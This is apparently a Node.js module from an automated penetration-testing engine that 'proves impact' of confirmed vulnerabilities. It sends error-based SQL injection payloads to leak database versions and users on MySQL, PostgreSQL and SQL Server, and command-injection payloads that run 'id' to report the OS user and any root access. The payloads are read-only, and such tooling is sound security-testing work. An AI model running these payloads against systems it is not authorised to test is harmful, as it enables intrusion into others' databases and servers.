#!/usr/bin/env node
/**
 * Impact / post-exploitation proof — the "so what" layer. It goes beyond "this is exploitable" to
 * safely DEMONSTRATE the blast radius, using BENIGN read-only markers (never destructive):
 *   - SQLi  → data extraction: pull database METADATA (version / current user) via the exact DBMS
 *             error format, proving real read access to the database, not just injectability.
 *   - RCE   → privilege context: run `id` and report the OS user (and whether it's ROOT).
 * Zero-FP: each demo confirms on a highly specific, provider-exact signature that only appears when
 * the payload actually executed. It re-uses the engine's method-aware injector + fetcher (passed in).
 */

const F = (tool, severity, target, detail) => ({
  tool,
  severity,
  target,
  detail,
  raw: JSON.stringify({ tool, detail }),
});

// Exact DBMS error formats these extraction techniques produce → provider-specific, zero-FP.
const EXTRACTORS = [
  ["' AND extractvalue(1,concat(0x7e,version()))-- -", /XPATH syntax error: '~([^']+)'/i, 'MySQL/MariaDB version'],
  [
    "' AND extractvalue(1,concat(0x7e,current_user()))-- -",
    /XPATH syntax error: '~([^']+)'/i,
    'MySQL/MariaDB current user',
  ],
  [
    "' AND 1=cast(version() as int)-- -",
    /invalid input syntax for (?:type )?integer: "([^"]+)"/i,
    'PostgreSQL version',
  ],
  ["' AND 1=convert(int,@@version)-- -", /Conversion failed when converting[^']*'([^']+)'/i, 'SQL Server version'],
];

async function sqliExtract(url, { fetchT, injReq }) {
  const bl = injReq(url, 'sxnormal123');
  const baseline = (await fetchT(bl.url, bl.opts)).body || '';
  for (const [payload, re, what] of EXTRACTORS) {
    const q = injReq(url, payload);
    const body = (await fetchT(q.url, q.opts)).body || '';
    const m = body.match(re);
    if (m && m[1] && m[1].length >= 3 && !baseline.includes(m[1]))
      return F(
        'impact-sqli-extract',
        'critical',
        url,
        `SQLi data extraction PROVEN: pulled ${what} → "${m[1].slice(0, 80)}" via error-based injection — the database is READABLE, not merely injectable`,
      );
  }
  return null;
}

async function cmdContext(url, { fetchT, injReq }) {
  for (const payload of [';id', '|id', '`id`', ';id #', '& id']) {
    const q = injReq(url, payload);
    const body = (await fetchT(q.url, q.opts)).body || '';
    const m = body.match(/uid=(\d+)\(([\w.-]+)\)\s+gid=\d+\([\w.-]+\)/);
    if (m)
      return F(
        'impact-cmd-context',
        'critical',
        url,
        `Command-execution IMPACT PROVEN: ran 'id' → uid=${m[1]}(${m[2]})${m[1] === '0' ? ' — running as ROOT' : ''} — full OS command execution in this account`,
      );
  }
  return null;
}

// deps: { fetchT, injReq } from the engine (so injection stays method-aware + host-gated).
export async function runImpact({ report, fetchT, injReq }) {
  const findings = [];
  const done = new Set();
  const confirmed = (report.exploits || []).filter((e) => e.confirmed > 0);
  const targetsOf = (cls) => {
    const e = confirmed.find((x) => x.cls === cls);
    return e ? [...new Set((e.findings || []).map((f) => f.target).filter(Boolean))] : [];
  };
  // SQLi extraction impact.
  for (const url of [...targetsOf('sqli'), ...targetsOf('sqli-auth-bypass')].slice(0, 5)) {
    if (done.has(`sqli:${url}`)) continue;
    done.add(`sqli:${url}`);
    const imp = await sqliExtract(url, { fetchT, injReq }).catch(() => null);
    if (imp) {
      findings.push(imp);
      break;
    }
  }
  // Command-execution impact.
  for (const url of targetsOf('cmd-injection').slice(0, 5)) {
    const imp = await cmdContext(url, { fetchT, injReq }).catch(() => null);
    if (imp) {
      findings.push(imp);
      break;
    }
  }
  return findings;
}

export { sqliExtract, cmdContext };
